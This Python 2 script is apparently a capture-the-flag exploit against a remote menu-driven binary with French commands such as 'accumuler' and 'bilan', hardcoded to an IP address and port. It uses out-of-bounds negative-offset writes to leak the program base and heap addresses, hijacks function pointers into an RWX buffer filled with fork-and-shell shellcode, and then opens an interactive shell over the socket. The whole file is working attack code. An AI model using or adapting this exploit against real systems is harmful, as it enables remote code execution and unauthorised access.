from codez import *


class R(Remote):
    def _cmd(self,c):
        self.read('>')
        self.sendline(c)
        
    
    def add(self,data,_l=0):
        if not _l:
            _l = len(data)
        self._cmd('accumuler')
        self.read(':')
        self.sendline(str(_l))
        self.read(':')
        self.sendline(data)

    def update(self,id,pos,b):
        self._cmd('update')
        self.read(':')
        self.sendline(str(id))
        self.read(':')
        self.sendline(str(pos))
        self.read(':')
        self.sendline(str(b))
        
    def toggle(self):
        self._cmd('toggle')

    def bilan(self):
        self._cmd('bilan')
        r = self.read('>')
        self.sendline("x")
        return r
    
    def select(self):
        self._cmd('select')
    
#r = R('localhost',1234)
r = R('52.17.42.45',9889)
r.add('asdf')
r.toggle()
r.update(0,-28,255)
d= r.bilan()

d = d[d.find('asdf')+4:]
d = d[d.find("\xc0"):]
funcs = unpack('Q'*7,d[:56])
#print map(hex,funcs)
base = funcs[0] - 0x21c0
print '[+] base',hex(base)

r.add('fap')
r.add('dupadupa')
r.add('xxxxxxxx')
#r.update(1,-28,255)
#d=r.bilan()
#d = d[d.find('dupa')+4:]
#print `d`
r.update(1,-28,255)
for i,c in enumerate(pack('Q',base + 0x2071e0)):
    r.update(3,-68+i,ord(c))
#r.update(1,0,51)
d= r.bilan()
# heap_addr = unpack('Q',d[-10:-2])[0]
#print `d`
heap_a=unpack('Q',d[d.find('8\n\tData')+9:][:8])[0]
print '[+] heap', hex(heap_a)
for i,c in enumerate(pack('Q',heap_a+0x800)):
    r.update(3,-68+i,ord(c))
#raw_input('dbg')
r.update(2,0,7)
r.add((fork('x64')+sh('x64')).ljust(800,"\xcc"))
r.read(1)
d=r.bilan()
rwxb=unpack('Q',d[d.find(pack('Q',800))+8:][:8])[0]
print '[+] rwx buffer',hex(rwxb)
for i,c in enumerate(pack('Q',rwxb)):
    r.update(1,-(40 + 8*3)+i,ord(c))
r.select()
import telnetlib
t = telnetlib.Telnet()
t.sock = r.sock
t.interact()

